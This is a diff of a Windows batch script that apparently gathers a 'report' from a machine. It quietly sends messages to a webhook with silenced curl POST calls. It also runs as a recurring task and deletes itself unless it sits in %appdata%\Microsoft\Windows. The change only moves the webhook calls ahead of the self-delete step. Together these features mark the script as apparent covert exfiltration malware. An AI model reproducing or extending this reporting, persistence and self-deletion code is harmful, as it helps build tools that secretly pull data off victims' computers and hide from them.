@@ -83,6 +83,11 @@ goto skiprecurring
 2>NUL set "recurring=true, %when%"
 :skiprecurring
 
+:: SEND STATUS MESSAGE
+2>NUL curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Recurring (Tasked): %recurring%```\"}"  %webhook%
+:: SEND REPORT ENDED MESSAGE
+2>NUL curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[End of report]```\"}"  %webhook%
+
 :: SELF DELETE AFTER EXECUTION - REMOVE GOTO IF YOU WANT IT
 goto skipselfdelete
 2>NUL if not "%cd%"=="%appdata%\Microsoft\Windows" (
@@ -91,11 +96,6 @@ goto skipselfdelete
 2>NUL start /b "" cmd /c del "%~f0"&exit /b
 )
 :skipselfdelete
-
-:: SEND STATUS MESSAGE
-2>NUL curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Recurring (Tasked): %recurring%```\"}"  %webhook%
-:: SEND REPORT ENDED MESSAGE
-2>NUL curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[End of report]```\"}"  %webhook%
 
 :remove_this_if_you_agree_to_follow_the_TOS
 exit
